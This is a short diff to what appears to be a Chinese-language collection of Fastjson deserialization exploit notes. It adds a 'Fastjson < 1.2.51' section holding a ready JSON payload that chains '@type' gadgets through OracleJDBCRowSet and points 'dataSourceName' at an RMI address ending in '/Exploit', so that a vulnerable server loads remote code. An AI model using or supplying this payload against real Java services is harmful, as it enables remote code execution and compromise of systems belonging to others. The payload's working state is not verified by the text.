@@ -482,8 +482,12 @@ poc:
 ```
 
 
-**1.2.48之后版本，小弟水平有限还未复现研究，payload需要注意的细节还未探索**
+**1.2.48之后版本，比较困难**
 
+### Fastjson < 1.2.51
+```
+{"@type":"java.lang.AutoCloseable","@type":"oracle.jdbc.rowset.OracleJDBCRowSet","dataSourceName":"rmi://127.0.0.1:2333/Exploit","command":"a"}
+```
 
 ### Fastjson1.2.5 <= 1.2.59
 
